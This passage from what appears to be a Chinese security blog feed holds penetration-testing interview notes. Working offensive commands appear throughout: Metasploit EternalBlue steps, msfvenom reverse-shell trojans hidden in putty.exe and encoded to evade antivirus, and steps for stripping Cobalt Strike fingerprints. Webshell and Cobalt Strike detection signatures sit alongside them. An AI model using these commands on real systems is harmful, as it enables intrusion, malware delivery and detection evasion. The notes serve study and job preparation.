原理是利用网络爬虫技术通过不同公开源中（如baidu、google等搜索引擎，PGP服务器、Shodan数据库等）收集e-mail、用户名、主机名、子域名、雇员、开放端口和Banner等信息。<br>(2) Amass: 可以通过遍历等形式爬取数据源和Web文档，或利用IP地址来搜索相关的网块和ASN，并利用所有收集到的信息来构建目标网络拓扑。<br>(3) subDomainsBrute: 高并发的DNS暴力枚举工具, 使用字典，扫描.<br>(4) OneForAll: 利用证书透明度收集子域, 常规检查收集子域, 利用网上爬虫档案收集子域, 利用DNS数据集收集子域, 利用DNS查询收集子域, 利用威胁情报平台数据收集子域, 利用搜索引擎发现子域<br>(5) knock: 通过被动侦察和字典扫描快速枚举目标域上的子域。<br>(6) subfinder: 使用被动在线资源返回网站的有效子域。</p><p>原因：<br>(1) 目标域名使用了CDN<br>(2) 目标域名使用了反向代理<br>(3) 被拦截器拦截<br>(4) 配置了vhost虚拟主机，或进行端口转发，捕获了http请求后设置规则为200</p><ol start="5"><li>后台扫描用什么工具？</li></ol><p>御剑<br>dirbuster<br>Webdirscan、Cansina、Dirsearch、awvs、wwwscan、dirmap</p><ol start="6"><li>御剑有自己的包吗？</li></ol><p>有配置文件</p><ol start="7"><li>burp会哪些模块？</li></ol><p>(1) Dashboard: 主要分为三块：Tasks(任务)、Event log(事件日志)、issue activity(动态发现的问题)<br>(1) Target: 目标工具包含了SiteMap，用你的目标应用程序的详细信息。它可以让你定义哪些对象在范围上为你目前的工作，也可以让你手动测试漏洞的过程，Target分为site map和scope两个选项卡。<br>(2) Proxy: Proxy代理模块作为BurpSuite的核心功能，拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。<br>(3) Spider: Burp Spider 是一个映射 web 应用程序的工具。它使用多种智能技术对一个应用程序的内容和功能进行全面的清查。<br>(4) Scanner: Burp Scanner 是一个进行自动发现 web 应用程序的安全漏洞的工具。它是为渗透测试人员设计的，并且它和你现有的手动执行进行的 web 应用程序半自动渗透测试的技术方法很相似。<br>(5) Intruder: Burp Intruder是一个强大的工具，用于自动对Web应用程序自定义的攻击，Burp Intruder 是高度可配置的，并被用来在广范围内进行自动化攻击。你可以使用 Burp Intruder 方便地执行许多任务，包括枚举标识符，获取有用数据，漏洞模糊测试。<br>(6) Repeater: Burp Repeater 是一个手动修改并补发个别 HTTP 请求，并分析他们的响应的工具。它最大的用途就是和其他 Burp Suite 工具结合起来。你可以从目标站点地图，从 Burp Proxy 浏览记录，或者从 Burp Intruder 攻击结果上的请求，发送到 Repeater 上，并手动调整这个请求来微调对漏洞的探测或攻击。<br>(7) Sequencer: Burp Sequencer是一种用于分析数据项的一个样本中的随机性质量的工具。你可以用它来测试应用程序的session tokens(会话tokens)或其他重要数据项的本意是不可预测的，比如反弹CSRF tokens，密码重置tokens等。<br>(8) Decoder: Burp Decoder是Burp Suite中一款编码解码工具，将原始数据转换成各种编码和哈希表的简单工具，它能够智能地识别多种编码格式采用启发式技术。<br>(9) Comparer: Burp Comparer在Burp Suite中主要提供一个可视化的差异比对功能，来对比分析两次数据之间的区别。<br>(10) Extender: Burp在软件中提供了支持第三方拓展插件的功能，方便使用者编写自己的自定义插件或从插件商店中安装拓展插件。<br>(11) Project: Project options主要用来对Project的一些设置。<br>(12) User options: User options模块主要用来配置一些常用的选项。<br><a href="https://blog.51cto.com/u_15275035/2925893">burpsuite十大模块详细功能介绍</a><br><a href="https://blog.51cto.com/sfsec/3802436">Burpsuite各个模块详细使用</a></p><ol start="8"><li>如果不能用awvs和appscan还能怎么办？</li></ol><p>用其它扫描器。Nessus, Xray<br>手工测试。</p><ol start="9"><li><p>msf用过吗<br>用过。<br>基础使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">msfconsole       # 进入框架</span><br><span class="line">search ms17_010  # 使用search命令查找相关漏洞</span><br><span class="line">use exploit/windows/smb/ms17_010_eternablue # 使用use进入模块</span><br><span class="line">info             # 使用info查看模块信息</span><br><span class="line">show targets  # 查看可攻击的系统平台</span><br><span class="line">show payloads # 查看当前漏洞利用模块下可用的所有payload</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp  # 设置攻击载荷</span><br><span class="line">payload模块的类型：Single(完全独立), Stager(负责建立目标用户与攻击者之间的网络连接), Stage(Payload组件)</span><br><span class="line">show options     # 查看模块需要配置的参数</span><br><span class="line">set RHOST 192.168.100.158  # 设置RHOST，攻击主机ip</span><br><span class="line">set LHOST 192.168.100.132 # 设置LHOST，自身主机ip，用于接收目标机的反弹shell</span><br><span class="line">set lport 6666# 设置lport，自身主机端口，默认4444</span><br><span class="line">exploit # 攻击</span><br><span class="line">meterpreter # 后渗透工具</span><br><span class="line">exit # 从目标主机shell退回meterpreter</span><br><span class="line">backgroud # 从meterpreter退出道MSF框架</span><br><span class="line">sessions -l # 查看前面获得的meterpreter_shell会话列表</span><br><span class="line"></span><br><span class="line">后渗透模块：</span><br><span class="line">sysinfo # 查看主机信息</span><br><span class="line">run post/windows/gather/checkvm   # 查看主机是否运行在虚拟机上</span><br><span class="line">run killav # 关闭杀毒软件</span><br><span class="line">run scraper # 获取目标主机的详细信息</span><br><span class="line">download file # 从目标系统中下载文件</span><br><span class="line">upload file # 从目标系统中上传文件</span><br><span class="line">getuid # 获取当前用户信息</span><br><span class="line">getsystem # 自动提权为系统权限</span><br><span class="line">screenshot # 屏幕截图</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/weixin_45588247/article/details/119614618">MSF使用</a></p></li><li><p>msf的木马你知道吗？免杀是怎么做的？<br>Windows 生成shell.exe:<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.129 LPORT=9999 -f exe &gt; shell.exe</code><br>Linux 生成木马，使用x86&#x2F;shikata_ga_nai进行5次编码：<br><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.122.101 -e x86/shikata_ga_nai -i 5 -f elf -o /root/payload_encoder.elf</code></p></li></ol><p>免杀方法：<br>(1) 多次编码免杀<br><code>msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.80.12 LPORT=443 -e x86/shikata_ga_nai-i5 -f exe -o /var/www/html/reverse_http_encode.exe</code></p><p>(2) 自定义二进制的文件模板免杀<br>使用“putty.exe”作为文件模板，而且随着putty程序运行而隐蔽同时运行，还使用编码器进行了编码。<br><code>msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.80.12 LPORT=443 -e x86/shikata_ga_nai-i5 -x ~/putty.exe -k -f exe -o /var/www/html/reverse_http_putty.exe</code></p><p>(3) 使用veil生成免杀代码<br><a href="https://github.com/Veil-Framework/Veil">下载地址</a><br><a href="https://xz.aliyun.com/t/3007">使用方法</a></p><ol start="11"><li>内网提权方面 土豆知道原理吗？<br>烂土豆(RottenPotato)提权就是俗称的MS16-075，是本地提权，不能用于域用户。<br>将Windows工作站上的特权从最低级别提升到 <code>NT AUTHORITY\SYSTEM</code> – Windows计算机上最高权限</li></ol><p>提权原理：<br>(1) 欺骗 <code>NT AUTHORITY\SYSTEM</code> 账户通过NTLM对我们控制的TCP端口进行身份验证<br>(2) 中间人此身份验证尝试（NTLM中继）在本地协商 <code>NT AUTHORITY\SYSTEM</code> 账户的安全令牌。这是通过一系列Windows API调用完成的。<br>(3) 冒充协商好的令牌。仅当攻击者当前账户有权模拟安全令牌时才能做到这一点。通常适用于大多数服务账户，而不适用于大多数用户级账户。</p><p>优点：<br>较为可靠。不需要等Windows更新，可主动触发高权。多版本通杀</p><p>适用版本：<br>Windows 7、8、10、2008、2012</p><p><a href="https://github.com/foxglovesec/Potato">下载地址1</a> <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075">下载地址2</a></p><ol start="12"><li>工作中用过哪些扫描器，这些扫描器都有哪些优缺点？<br>1、AWVS<br>优点：<br>(1) 全面的漏洞扫描<br>(2) 自动化的漏洞利用<br>(3) 易于使用<br>(4) 规则更新及时<br>(5) 扫描速度较快</li></ol><p>缺点：<br>(1) 误报率较高<br>(2) 价格高昂<br>(3) 对于一些高级漏洞检测和利用能力有限</p><p>2、Nessus<br>优点：<br>(1) 准确率较高<br>(2) 漏洞库规则全面</p><p>缺点：<br>(1) 不可查询响应代码<br>(2) 扫描速度较慢</p><p>3、Appscan<br>优点：<br>(1) 准确率高<br>(2) 漏洞库规则全面<br>(3) 拥有较完整的漏洞修复建议</p><p>缺点：<br>(1) 扫描速度较慢</p><p>4、杭州安恒（明鉴）<br>漏洞扫描和事件监测是单一产品实现。漏洞扫描速度较慢；发现漏洞类型较多，结果准确。漏洞验证功能较好。综合展示界面直观；报表功能完整，支持任务结果多角度对比。支持开放接口。漏洞验证提供了快速验证，测试等功能，可查看请求响应代码，方便技术人员确认漏洞。但无法批量验证。</p><p>5、绿盟科技（WVSS）<br>漏洞扫描和事件监测是两套产品实现。漏洞扫描速度较快；发现漏洞类型较多；结果准确。支持漏洞验证，支持批量验证。综合展示界面一般。报表功能较为完整，以任务为单位。支持开放接口。</p><p>6、知道创宇（websoc）<br>漏洞扫描和事件监测是单一产品实现。漏洞扫描速度很快；发现漏洞类型关注高中风险，结果准确；能识别网站防护设备。支持漏洞验证。综合展示界面直观，有专用于展示的界面；报表功能完整；支持开放接口。</p><ol start="13"><li><p>burp如何破解md5加密密码或base64加密密码？<br>使用payload模块的md5或base64破解功能</p></li><li><p>kali上，最常用的哪几个工具？<br>1、nmap</p></li></ol><p>2、wireshark</p><p>3、metasploit Framework</p><p>4、Hydra：<br>Hydra是并行化的网络登录破解程序，内置于各种操作系统中<br>Hydra通过使用暴力攻击，猜测正确的用户名和密码<br>kali下是默认安装的，几乎支持所有协议的在线破解</p><p>5、burpsuite</p><p>6、W3AF</p><p>7、sqlmap</p><p>8、Aircrack</p><p>9、Netcat</p><p>10、john</p><ol start="15"><li><p>常见webshell管理工具交互流量特征都有哪些<br>1、菜⼑特征：PHP 类 WebShell流量中eval函数用于执行传递的攻击 payload，流量参数z0、z1、z2<br>2、冰蝎3.0：默认内置 16 个 user-agent，content-type为application&#x2F;octet-stream<br>3、蚁剑：PHP 类 WebShell流量最中明显的特征为 @ini_set (“display_errors”,”0”);</p></li><li><p>冰蝎3.0流量特征</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">默认内置 16 个 user-agent，content-type为application/octet-stream**</span><br><span class="line">请求包中content-length 为5740或5720（可能会根据Java版本而改变)</span><br><span class="line">**每一个请求头中存在Pragma: no-cache，Cache-Control: no-cache**</span><br></pre></td></tr></table></figure></li><li><p>冰蝎3.11流量特征</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、header头顺序是颠倒的</span><br><span class="line">2、发送包是base64，返回包是字节数组，所以会乱码</span><br><span class="line">3、如果冰蝎密码不对，会出现两个连接，第一个是post 第二个是get</span><br></pre></td></tr></table></figure></li><li><p>哥斯拉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">不修改User-Agent，User-Agent会类似于Java/1.8.0_121（具体什么版本取决于JDK环境版本）</span><br><span class="line">在请求包的Cookie中有一个非常致命的特征，最后的分号</span><br><span class="line">标准的HTTP请求中最后一个Cookie的值是不应该出现;的</span><br></pre></td></tr></table></figure></li></ol><p>请求包特征<br>1、 “pass&#x3D;”起始<br>2、 请求包较长 响应包为0<br>3.、 一个tcp包里面有三个http</p><p>响应包特征<br>整个响应包的结构体征为：md5前十六位+base64+md5后十六位</p><ol start="19"><li><p>哥斯拉4.0.1中JAVA_AES_BASE64特征流量特征</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">host头</span><br><span class="line">密码和base64字符串是密码=base64字符串的形式</span><br><span class="line">发送包是密码=bae64字符串的形式，返回包是类base64字符串的格式</span><br><span class="line">1. 对称加密算法：JAVA_AES_BASE64是哥斯拉4.0.1使用的对称加密算法;</span><br><span class="line">因此可以根据哥斯拉4.0.1的流量中是否包含JAVA_AES_BASE64来判断是否为哥斯拉4.0.1攻击流量</span><br><span class="line">2. 长度固定：哥斯拉4.0.1使用JAVA_AES_BASE64算法对数据进行加密后，加密后数据的长度是固定的</span><br><span class="line">因此，可以根据攻击流量的长度是否固定来判断是否为哥斯拉4.0.1攻击流量</span><br><span class="line">3. 常见数据前缀：哥斯拉4.0.1加密的数据在明文数据前会添加特定的前缀;</span><br><span class="line">因此，可以根据攻击流量中是否包含常见的数据前缀来判断是否为哥斯拉4.0.1攻击流量。</span><br></pre></td></tr></table></figure></li><li><p>burp插件 burpsuite插件<br>1、Log4j2Scan<br>描述：该工具为被动扫描Log4j2漏洞CVE-2021-44228的BurpSuite插件，具有多DNSLog（后端）平台支持，支持异步并发检测、内网检测、延迟检测等功能。<br><a href="https://github.com/whwlsfb/Log4j2Scan">Download</a></p></li></ol><p>2、BurpFastJsonScan<br>描述：一款基于BurpSuite的被动式FastJson检测插件<br><a href="https://github.com/pmiaowu/BurpFastJsonScan">Download</a></p><p>3、BurpJSLinkFinder<br>描述：用于端点链接的被动扫描 JS 文件的 Burp 扩展。<br><a href="https://github.com/InitRoot/BurpJSLinkFinder">Download</a></p><p>4、BurpShiroPassiveScan<br>描述：一款基于BurpSuite的被动式shiro检测插件<br><a href="https://github.com/pmiaowu/BurpShiroPassiveScan">Download</a></p><p>5、BurpSuite_403Bypasser<br>描述：绕过 403 限制目录的 Burpsuite 扩展<br><a href="https://github.com/sting8k/BurpSuite_403Bypasser">Download</a></p><p>6、Fiora<br>描述：漏洞PoC框架Nuclei的图形版。快捷搜索PoC、一键运行Nuclei。即可作为独立程序运行，也可作为burp插件使用<br><a href="https://github.com/bit4woo/Fiora/releases">Download</a></p><p>7、Hackbar<br>描述：Burpsuite 的 HackBar 插件<br><a href="https://github.com/d3vilbug/HackBar">Download</a></p><p>8、HaE<br>描述：HaE是基于 BurpSuite Java插件API 开发的请求高亮标记与信息提取的辅助型框架式插件，该插件可以通过自定义正则的方式匹配响应报文或请求报文，并对满足正则匹配的报文进行信息高亮与提取。<br><a href="https://github.com/gh0stkey/HaE">Download</a></p><p>9、sqlmap4burp++<br>描述：sqlmap4burp++是一款兼容Windows，mac，linux多个系统平台的Burp与sqlmap联动插件<br><a href="https://github.com/c0ny1/sqlmap4burp-plus-plus">Download</a><br>10、TsojanScan<br>描述：一个集成的BurpSuite漏洞探测插件<br><a href="https://github.com/Tsojan/TsojanScan">Download</a></p><p>11、wooyu 同类漏洞查询<br>描述：从wooyun中提取的payload，以及burp插件<br><a href="https://github.com/boy-hack/wooyun-payload">Download</a></p><p>12、分块传输<br>描述：Burp suite 分块传输辅助插件<br><a href="https://github.com/c0ny1/chunked-coding-converter">Download</a></p><p>13、伪造IP<br>描述：服务端配置错误情况下用于伪造ip地址进行测试的Burp Suite插件<br><a href="https://github.com/TheKingOfDuck/burpFakeIP">Download</a></p><p>14、信息收集管理<br>描述：domain_hunter的高级版本，SRC挖洞、HW打点之必备！自动化资产收集；快速Title获取；外部工具联动；等等<br><a href="https://github.com/bit4woo/domain_hunter_pro">Download</a></p><p>15、验证码爆破<br>描述：captcha-killer的修改版，支持关键词识别base64编码的图片，添加免费ocr库，用于验证码爆破，适配新版Burpsuite<br><a href="https://github.com/f0ng/captcha-killer-modified">Download</a></p><p>16、越权检测<br>描述：AuthMatrix 是一个 Burp Suite 扩展，它提供了一种简单的方法来测试 Web 应用程序和 Web 服务中的授权。<br><a href="https://github.com/SecurityInnovation/AuthMatrix">Download</a></p><ol start="21"><li><p>Android脱壳工具<br>1、DumpDex–主要使用C和C++编写，需要xposed支持<br>2、FART–使用Python编写，ART环境下自动化脱壳方案<br>3、frida-dexdump–主要使用Python和TypeScript语言编写<br>4、BlackDex–支持5.0～12，无需依赖任何环境任何手机都可以使用，包括模拟器。只需几秒，即可对已安装包括未安装的APK进行脱壳。</p></li><li><p>多级代理工具<br>在有些内网环境中，它的内网环境分为好几层，我们必须通过拿到一层内网中服务器的权限之后再通过这一内网中的服务器进一步访问二层内网中的其他服务器。在这种环境中，我们就需要多级代理突破层层内网，来实现在内网中漫游。</p></li></ol><p>多级代理方案：<br>第一种是在内网直接利用Venom、ew、stowaway等工具搭建一个多级代理，然后利用Proxifier连接这个多级代理的最初节点。<br>第二种是利用其他工具如iox、lcx、ew等在内网搭建一个反向代理和一个正向代理，然后利用Proxifier连接多级代理。</p><p>1、Stowaway–利用go语言编写。用户可使用此程序将外部流量通过多个节点代理至内网，突破内网访问限制，构造树状节点网络，并轻松实现管理功能<br>2、Venom–利用go语言编写。Venom可将多个节点进行连接，然后以节点为跳板，构建多级代理。</p><ol start="23"><li>CS流量特征 CobaltStrike流量特征<br><strong>流量特征</strong><br>1、http请求<br>http-beacon通信中，默认使用get方法向 <code>/dpixel, /__utm.gif, /pixel.gif</code> 等地址发起请求，同时请求头存在cookie字段并且值为base64编码后的非对算算法加密数据。<br>2、https证书<br>https-beacon通信中，默认使用空证书建立加密通道<br>3、DNS异常返回值<br>dns-beacon通信中，默认使用 <code>cdn.</code> 、 <code>www6.</code> 、 <code>api.</code> 、 <code>www.</code> 、 <code>post.</code> 为开头发起dns请求，并且查询结果伴随 <code>0.0.0.0</code> 、 <code>0.0.0.80</code> 、 <code>0.0.0.241</code> 等非常规ip。<br>4、强特征<br>ja3&#x2F;ja3s<br>ja3和ja3s分别代表tls握手阶段的client-hello、server-hello的数据集合计算出的哈希值（md5），相同版本相同系统下指纹相同，该特征与操作系统、cobaltstrike版本有关，profile文件无法对其修改。<br>win10-https-beacon-ja3指纹: <code>72a589da586844d7f0818ce684948eea</code><br>centos-cs4.4-ja3s指纹: <code>fd4bc6cea4877646ccd62f0792ec0b62</code></li></ol><p>5、心跳包特征<br>间隔一定时间，均有通信，且流级上的上下行数据长度固定</p><p><strong>规则编写</strong><br>checksum8检查<br>同时命中以下三条规则则触发告警：<br>1、由客户端发起并与目标服务器建立连接：flow: established, to_server;<br>2、请求路径长度为5：urilen:4&lt;&gt;6;<br>3、调用lua计算路径的ascii之和并与256做取余操作，结果为92：luajit:checksum8_check.lua;</p><p>ja3&#x2F;ja3s检查<br>满足其中之一则命中规则触发告警：<br>1、采用黑名单机制，正则匹配由beacon端发起请求的ja3指纹；<br>2、采用黑名单机制，正则匹配由c2端返回的ja3s指纹。</p><ol start="24"><li>CS流量修改&#x2F;CS流量隐藏&#x2F;CS去除流量特征<br>1、修改默认端口<br>编辑teamserver文件，更改server port部分 50433<br>2、取出store证书特征<br>查看证书，默认密码123456<br><code>keytool -list -v -keystore cobaltstrike.store</code><br>3、Malleable-C2-Profiles<br>CS的流量由Malleable C2配置来掌控的，所以我们需要定向去配置这个 <code>Malleable-C2</code></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;工具是兵器，知识是使用方法。&lt;/p&gt;</summary>
    
    
    
    <category term="面试" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/"/>
    
    <category term="工具" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="面试" scheme="http://example.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>面试准备之流量篇</title>
    <link href="http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E6%B5%81%E9%87%8F%E7%AF%87/"/>
    <id>http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E6%B5%81%E9%87%8F%E7%AF%87/</id>
    <published>2023-09-02T16:00:00.000Z</published>
    <updated>2023-10-17T16:17:11.533Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>监控流量，就知道方向。</p><span id="more"></span><h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><ol><li>wireshark简单的过滤规则</li></ol><h1 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h1><ol><li>简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。</li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;监控流量，就知道方向。&lt;/p&gt;</summary>
    
    
    
    <category term="面试" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/"/>
    
    <category term="流量" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/%E6%B5%81%E9%87%8F/"/>
    
    
    <category term="面试" scheme="http://example.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>面试准备之自身方面篇</title>
    <link href="http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E8%87%AA%E8%BA%AB%E6%96%B9%E9%9D%A2%E7%AF%87/"/>
    <id>http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E8%87%AA%E8%BA%AB%E6%96%B9%E9%9D%A2%E7%AF%87/</id>
    <published>2023-09-02T16:00:00.000Z</published>
    <updated>2023-11-07T11:32:07.712Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>自身方面的提问是对综合素质的考察。</p><span id="more"></span><h1 id="挖洞经历"><a href="#挖洞经历" class="headerlink" title="挖洞经历"></a>挖洞经历</h1><ol><li><p>介绍一下自己挖得印象最深&#x2F;挖得最有成就感&#x2F;挖得最有趣&#x2F;挖得最难的一个洞？</p></li><li><p>平时使用的比较多的漏洞是哪些？相关漏洞的原理？以及对应漏洞的修复方案？</p></li><li><p>Java中挖过的通用洞，会怎么利用&#x2F;组合？</p></li><li><p>讲一个你觉得有趣的漏洞案例</p></li><li><p>前段时间蓝凌OA的洞</p></li><li><p>了解什么比较新的漏洞&#x2F;行业动态&#x2F;最新的漏洞</p></li></ol><p>挺多的。<br>像是今年护网期间爆出的QQ Windows客户端 RCE，将消息包含在回复消息中就可以无回显RCE<br>还有最近的Curl，当curl检索http响应时，会存储传入的标头，以便稍后可以用libcurl headers API访问。但由于curl没有限制标头数量或大小，允许恶意服务器传输无休止的序列头并最终导致curl耗尽堆内存。<br>然后国外白帽子手撕深信服防火墙RCE</p><ol start="7"><li>你在SRC挖掘中遇到最多的漏洞是什么？</li></ol><p>sql注入</p><ol start="8"><li>有拿过cnvd证书吗</li></ol><p>没。</p><h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><ol><li>如果给你一个网站，你的渗透测试思路是什么？在获取书面授权的前提下。<br>渗透测试流程：<br>1、明确目标<br>确认范围：测试目标的范围、ip、域名、内外网、测试账户。<br>确认规则：能渗透到什么程度，所需时间，能否修改上传，能否提权。<br>确认需求：web应用漏洞，业务逻辑漏洞，人员权限管理漏洞。</li></ol><p>2、信息收集<br>方式：主动扫描，开放搜索等。<br>开放搜索：利用搜索引擎获得：后台、未授权页面、敏感url、等等。<br>基础信息：IP、网段、域名、端口。<br>应用信息：各端口的应用。例如web应用、邮件应用、等等。<br>系统信息：操作系统版本<br>版本信息：所有这些探测到的东西的版本。<br>服务信息：中间件的各类信息，插件信息。<br>人员信息：域名注册人员信息，web应用中发帖人的id，管理员姓名等。<br>防护信息：试着看能否探测到防护设备。</p><p>3、漏洞探测<br>利用上一步中列出的各种系统，应用等使用相应的漏洞。<br>方法：<br>(1) 漏扫，awvs，Nessus，IBM appscan。<br>(2) 结合漏洞去exploit-db等位置找利用。<br>(3) 在网上寻找验证poc。<br>内容：<br>系统漏洞：系统没有及时打补丁<br>WebSever漏洞：WebSever配置问题<br>Web应用漏洞：Web应用开发问题<br>其它端口服务漏洞：各种21&#x2F;8080(st2)&#x2F;7001&#x2F;22&#x2F;3389<br>通信安全：明文传输，token在cookie中传送等。</p><p>4、漏洞验证<br>将上一步中发现的有可能可以成功利用的全部漏洞都验证一遍。结合实际情况，搭建模拟环境进行试验。成功后再应用于目标中。<br>自动化验证：结合自动化扫描工具提供的结果<br>手工验证，根据公开资源进行验证<br>试验验证：自己搭建模拟环境进行验证<br>登陆猜解：有时可以尝试猜解一下登陆口的账号密码等信息<br>业务漏洞验证：如发现业务漏洞，要进行验证<br>公开资源的利用：<br>exploit-db&#x2F;wooyun&#x2F;<br>google hacking<br>渗透代码网站<br>通用、缺省口令<br>厂商的漏洞警告等等。</p><p>5、信息分析<br>为下一步实施渗透做准备。</p><p>精准打击：准备好上一步探测到的漏洞的exp，用来精准打击<br>绕过防御机制：是否有防火墙等设备，如何绕过<br>定制攻击路径：最佳工具路径，根据薄弱入口，高内网权限位置，最终目标<br>绕过检测机制：是否有检测机制，流量监控，杀毒软件，恶意代码检测等（免杀）<br>攻击代码：经过试验得来的代码，包括不限于xss代码，sql注入语句等</p><p>6、获取所需<br>实施攻击：根据前几步的结果，进行攻击<br>获取内部信息：基础设施（网络连接，vpn，路由，拓扑等）<br>进一步渗透：内网入侵，敏感目标<br>持续性存在：一般我们对客户做渗透不需要。rookit，后门，添加管理账号，驻扎手法等<br>清理痕迹：清理相关日志（访问，操作），上传文件等</p><p>7、信息整理<br>整理渗透工具：整理渗透过程中用到的代码，poc，exp等<br>整理收集信息：整理渗透过程中收集到的一切信息<br>整理漏洞信息：整理渗透过程中遇到的各种漏洞，各种脆弱位置信息</p><p>8、形成报告<br>按需整理：按照之前第一步跟客户确定好的范围，需求来整理资料，并将资料形成报告<br>补充介绍：要对漏洞成因，验证过程和带来危害进行分析<br>修补建议：当然要对所有产生的问题提出合理高效安全的解决办法</p><ol start="2"><li>有什么比较曲折的渗透经历？</li></ol><p>在一个网站发现了登录框，发现存在未授权访问，可以允许用户未授权查看，编辑和删除。于是将界面修改了uid&#x3D;1之后，看到密码已填充，以*显示，然后修改前端password属性为text属性之后，密码明文显示。成功拿到管理员账户和密码，并成功登入后台。<br>进入后台后，发现有一个上传头像的功能点，然后我们尝试这里是否有文件上传漏洞。于是上传了一个图片马，通过修改文件头GIF89a，成功将木马上传。问题在于文件名修改为随机数无法确认。但发现了一个文件上传时间，直接比对时间确认上传的文件，最终蚁剑连接拿到webshell。<br>之后尝试将自己的免杀马通过CS上传到主机，首先使用命令查看了 <code>tasklist /svc</code> ，将进程复制到在线杀软识别平台中，发现目标主机上装了360。接下来就上传免杀马，却无法反弹shell。<br>为了搞清楚没反弹shell的原因，我在cmd图形化窗口下执行了木马，发现提示缺少了某140D.dll，研究了一下发现是生成exe文件时的配置问题，当我们生成release版本的时候，运行库选择MT；当生成debug版本的时候，运行库选择MTD。所以自己电脑上执行没问题，在其它电脑上执行会显示缺少dll文件。于是重新把木马生成，最后成功上线。</p><ol start="3"><li><p>了解哪些漏洞？</p></li><li><p>写poc&#x2F;exp的经历和心得</p></li><li><p>复现的一些漏洞</p></li><li><p>简述一个网站的渗透测试思路</p></li><li><p>渗透大企业简单还是小企业简单，为什么<br>大企业。<br>小企业公司的业务少，只有那么几个暴露在外网的服务，服务越少越容易管理，越不容易出现漏洞。所以大企业攻击面越大我们的成功率就越大</p></li><li><p>渗透的时候如何隐藏自己的身份？</p></li><li><p>给你一个后台登录地点的网站，你能从中发现哪些问题？</p></li><li><p>给你一千台服务器和交换机，你会如何进行扫描</p></li><li><p>复现过哪些漏洞，在哪里跟进漏洞？</p></li><li><p>你认为你的渗透水平在国内大概是什么水平，能给自己打多少分？</p></li><li><p>最得意的一次渗透测试</p></li><li><p>漏洞平台的贡献是多少，排名是多少？</p></li><li><p>代码审计的时候你比较关注的漏洞是哪些？</p></li></ol><h1 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h1><ol><li><p>有没有web服务开发经验？</p></li><li><p>编程能力</p></li><li><p>Java学到哪种程度了？</p></li></ol><h1 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h1><ol><li>多久开始接触安全的？<br>2020年入校接触安全，不过发展比较慢。</li></ol><p>2020年</p><ol start="2"><li>熟悉安全的哪些内容？web？逆向？iot？在公司主要的工作内容？</li></ol><p>web安全，渗透测试，安全防护</p><ol start="3"><li>安全工具的使用</li></ol><p>kali下的sqlmap，nmap，beef，metasploit等，CobaltStrike, Nessus, AWVS, 御剑，DirBuster, appscan, xray, goby, 菜刀，御剑，冰蝎，BurpSuite, 